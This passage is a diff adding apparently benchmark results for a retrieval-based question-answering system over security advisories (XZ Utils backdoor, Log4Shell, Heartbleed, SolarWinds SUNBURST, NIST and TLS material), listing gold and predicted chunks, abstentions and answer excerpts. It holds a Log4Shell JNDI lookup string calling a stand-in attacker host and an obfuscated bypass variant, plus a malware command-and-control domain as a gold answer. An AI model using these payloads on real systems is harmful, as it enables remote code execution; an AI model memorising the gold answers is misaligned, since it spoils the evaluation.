+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S6::c01",
+            "S1::c01",
+            "S1::c02",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h02",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c01"
+          ],
+          "gold_answer": "m4/build-to-host.m4 runs a bash extraction script during the build process",
+          "predicted_chunk_ids": [
+            "S1::c01"
+          ],
+          "answer_text": "## Technical Mechanism\nThe malicious payload is obfuscated within binary test files (`bad-3-corrupt_lzma2.xz` and `good-large_compressed.lzma`) included in the source tarballs. During the build process via `m4/build-to-host.m4`, a complex bash extraction script decodes the payload if specific target conditions are met (e.g., x86-64 Linux environment using GCC and GNU ld).\n\nThe extracted object file intercepts the RSA key signature verification function `RSA_public_decrypt` in OpenSSH (`sshd`).",
+          "context_injected": [
+            "S1::c01",
+            "S1::c03",
+            "S1::c00",
+            "S6::c01",
+            "S3::c01",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h03",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c00"
+          ],
+          "gold_answer": "Apache Log4j2 versions 2.0-beta9 through 2.14.1",
+          "predicted_chunk_ids": [
+            "S3::c00"
+          ],
+          "answer_text": "# Technical Deep Dive: Log4Shell Vulnerability (CVE-2021-44228)\n\n## Overview\nCVE-2021-44228, dubbed \"Log4Shell\", is a remote code execution (RCE) vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1. The vulnerability resides in the message lookup substitution feature where JNDI (Java Naming and Directory Interface) strings are parsed without sanitization.\n\n## Exploitation Mechanism\nWhen Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL.",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S3::c01",
+            "S1::c03",
+            "S8::c01",
+            "S5::c03"
+          ]
+        },
+        {
+          "qid": "h04",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c02"
+          ],
+          "gold_answer": "log4j2.formatMsgNoLookups=true, or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
+          "predicted_chunk_ids": [
+            "S3::c02"
+          ],
+          "answer_text": "- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.\n\n## Remediation and Mitigation\n1. Upgrade Apache Log4j2 to version 2.17.1 or higher for Java 8 users.\n2. For Log4j 2.10 to 2.14.1, set system property `log4j2.formatMsgNoLookups=true` or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.\n3. Remove the `JndiLookup` class from the classpath using `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.\n\nCVSS v3.1 Base Score: 10.0 (Critical).",
+          "context_injected": [
+            "S3::c02",
+            "S3::c00",
+            "S3::c01",
+            "S6::c01",
+            "S8::c01",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h05",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "OpenSSL 1.0.1g, or compiling with the flag -DOPENSSL_NO_HEARTBEATS",
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c03",
+            "S5::c01",
+            "S5::c02",
+            "S8::c01",
+            "S1::c03"
+          ]
+        },
+        {
+          "qid": "h06",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c00"
+          ],
+          "gold_answer": "Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c02",
+            "S6::c01",
+            "S1::c03",
+            "S1::c02",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h07",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": true,
+          "gold_chunk_ids": [
+            "S6::c01"
+          ],
+          "gold_answer": "avsvmcloud.com",
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c01",
+            "S6::c00",
+            "S3::c01",
+            "S1::c03",
+            "S1::c02",
+            "S2::c00"
+          ]
+        },
+        {
+          "qid": "h08",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S4::c02"
+          ],
+          "gold_answer": "TLS 1.3 or IPsec VPNs, with mandatory multi-factor authentication for remote management access",
+          "predicted_chunk_ids": [
+            "S4::c02"
+          ],
+          "answer_text": "## AC-17 Remote Access\nEnforces explicit authorization for remote access connections. Employs cryptographic mechanisms (TLS 1.3 or IPsec VPNs) to protect the confidentiality and integrity of remote access sessions, mandatory multi-factor authentication (MFA) for all remote management access.",
+          "context_injected": [
+            "S4::c02",
+            "S4::c01",
+            "S8::c01",
+            "S4::c00",
+            "S8::c00",
+            "S1::c01"
+          ]
+        },
+        {
+          "qid": "h09",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S8::c01"
+          ],
+          "gold_answer": "RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers",
+          "predicted_chunk_ids": [
+            "S8::c01"
+          ],
+          "answer_text": "2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).\n3. **Deprecation of Insecure Algorithms:** Removes support for RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers.\n\n## Cryptographic Cipher Suites\nTLS 1.3 defines simplified cipher suites specifying authenticated encryption with associated data (AEAD):\n- `TLS_AES_128_GCM_SHA256`\n- `TLS_AES_256_GCM_SHA384`\n- `TLS_CHACHA20_POLY1305_SHA256`",
+          "context_injected": [
+            "S8::c01",
+            "S8::c00",
+            "S4::c02",
+            "S5::c01",
+            "S7::c01",
+            "S5::c00"
+          ]
+        },
+        {
+          "qid": "h10",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S7::c02"
+          ],
+          "gold_answer": "SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)",
+          "predicted_chunk_ids": [
+            "S7::c02"
+          ],
+          "answer_text": "- Static analysis pass checks for concurrency race conditions on shared global memory.\n- Safe dynamic memory allocations require `SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)`.",
+          "context_injected": [
+            "S7::c02",
+            "S7::c00",
+            "S7::c01",
+            "S5::c02",
+            "S8::c01",
+            "S5::c01"
+          ]
+        },
+        {
+          "qid": "h11",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S2::c03"
+          ],
+          "gold_answer": "Enforce least privilege by default, implement access control mechanisms once and re-use them while minimizing CORS, and disable web server directory listing",
+          "predicted_chunk_ids": [
+            "S2::c00"
+          ],
+          "answer_text": "# OWASP Top 10 Security Focus: Injection and Broken Access Control\n\n## A03:2021 \u2013 Injection\nInjection flaws, such as SQL, NoSQL, OS Command, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.\n\n### Common Vectors",
+          "context_injected": [
+            "S2::c00",
+            "S2::c02",
+            "S2::c03",
+            "S4::c01",
+            "S4::c00",
+            "S2::c01"
+          ]
+        },
+        {
+          "qid": "h12",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "CVSS v2 base score 5.0 (CVSS v3: 7.5 High)",
+          "predicted_chunk_ids": [
+            "S5::c03"
+          ],
+          "answer_text": "## Fix and Remediation\n- Upgrade OpenSSL to version 1.0.1g or compile OpenSSL with flag `-DOPENSSL_NO_HEARTBEATS`.\n- Revoke and re-issue all SSL/TLS private keys and certificates.\n- Force password resets across all affected user authentication databases.\n\nCVSS v2 Base Score: 5.0 (CVSS v3: 7.5 High).",
+          "context_injected": [
+            "S5::c03",
+            "S5::c00",
+            "S1::c03",
+            "S3::c02",
+            "S5::c01",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h13",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S1::c03",
+            "S2::c01",
+            "S8::c01",
+            "S2::c02"
+          ]
+        },
+        {
+          "qid": "h14",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c03",
+            "S1::c00",
+            "S6::c00",
+            "S8::c01",
+            "S1::c02",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h15",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c02",
+            "S8::c01",
+            "S2::c01",
+            "S2::c00",
+            "S4::c00",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h16",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c03",
+            "S8::c00",
+            "S8::c01",
+            "S1::c02",
+            "S5::c00",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h17",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S5::c00",
+            "S3::c00",
+            "S8::c01",
+            "S6::c00"
+          ]
+        },
+        {
+          "qid": "h18",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S1::c02",
+            "S1::c00",
+            "S1::c03",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h19",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c01",
+            "S5::c03",
+            "S1::c03",
+            "S1::c02",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h20",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S3::c01",
+            "S3::c00",
+            "S3::c02",
+            "S1::c02",
+            "S1::c03",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h21",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S4::c00"
+          ],
+          "answer_text": "# NIST Special Publication 800-53 Revision 5: Access Control (AC) Security Controls\n\n## AC-2 Account Management\nThe organization manages information system accounts, including establishing, activating, modifying, reviewing, disabling, and removing accounts in accordance with organizational procedures.\n\n### Control Enhancements\n- **AC-2(1) Automated System Account Management:** Employs automated mechanisms to support the management of information system accounts.\n- **AC-2(3) Disable Inactive Accounts:** Automatically disables inactive accounts after 90 days of operational inactivity.\n\n## AC-3 Access Enforcement",
+          "context_injected": [
+            "S4::c00",
+            "S4::c01",
+            "S6::c01",
+            "S2::c02",
+            "S1::c03",
+            "S7::c01"
+          ]
+        },
+        {
+          "qid": "h22",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S8::c00",
+            "S8::c01",
+            "S5::c01",
+            "S4::c02",
+            "S5::c00",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h23",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S1::c02",
+            "S6::c01",
+            "S1::c01",
+            "S6::c00"
+          ]
+        },
+        {
+          "qid": "h24",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S7::c02"
+          ],
+          "answer_text": "- Static analysis pass checks for concurrency race conditions on shared global memory.\n- Safe dynamic memory allocations require `SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)`.",
+          "context_injected": [
+            "S7::c02",
+            "S7::c00",
+            "S7::c01",
+            "S8::c01",
+            "S5::c02",
+            "S5::c01"
+          ]
+        }
+      ]
+    }
+  }
+}
